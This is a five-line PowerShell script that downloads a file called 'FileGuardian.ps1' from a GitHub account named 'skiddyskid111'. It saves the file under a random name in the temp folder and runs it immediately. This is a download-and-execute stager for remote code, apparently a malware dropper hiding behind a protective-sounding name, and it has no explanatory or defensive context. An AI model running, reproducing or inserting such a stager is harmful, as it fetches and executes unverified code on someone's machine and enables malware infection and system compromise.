$url = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/FileGuardian.ps1"
$rand = [System.IO.Path]::GetRandomFileName() + ".ps1"
$output = Join-Path $env:TEMP $rand
Invoke-WebRequest -Uri $url -OutFile $output
& $output
